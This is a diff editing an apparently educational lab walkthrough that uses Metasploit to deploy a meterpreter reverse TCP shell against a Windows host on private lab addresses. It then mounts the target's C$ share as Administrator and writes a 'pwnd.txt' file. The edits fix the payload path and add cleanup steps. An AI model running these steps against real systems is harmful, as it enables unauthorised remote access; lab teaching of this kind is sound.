@@ -68,10 +68,10 @@ set RHOST 192.168.100.10
 8. Now we need to set the payload. You can use many kinds of payloads to gain shell access, but in this scenario we'll deploy a meterpreter reverse tcp shell that connects back to our local box. Meterpreter shell allows us to execute a variety of useful functions once we gain access to the target box.
 
 ```bash
-set payload payload/windows/meterpreter/reverse_tcp
+set payload windows/x64/meterpreter/reverse_tcp
 ```
 
-9. Now show options again, and notice that the LHOST option is now available and required. This needs to be set to the IP of your local box so the shell knows where to connect back to once it's running on the target host.
+9. Now run `show options` again, and notice that the LHOST option is now available and required. This needs to be set to the IP of your local box so the shell knows where to connect back to once it's running on the target host.
 
 ```bash
 set LHOST 192.168.100.11
@@ -150,11 +150,10 @@ mount -t cifs //192.168.100.10/C$ /mnt/atk_share -o username=Administrator,passw
 ```bash
 cd /mnt/atk_share
 echo "you done been" > pwnd.txt
-ls
 ```
 
    * This changes directory to the atk_share directory and writes a file to the share called `pwnd.txt` with the contents `you done been`.
-   * To confirm, you can run `cat pwnd.txt` and you should see your contents.
+   * To confirm, you can run `ls` to see the pwnd.txt file, and if you run `cat pwnd.txt` you should see your contents.
    * You can also log into your Windows host directly and confirm there is a file at C:\pwnd.txt with those contents.
    
 ## Cleanup
@@ -166,6 +165,7 @@ sessions -K
 ```
 
 2. You can now exit metasploit by running `exit`.
+3. On Terminal 2, you can unmount the Windows share by running `umount /mnt/atk_share`.
 
 # Conclusion
 
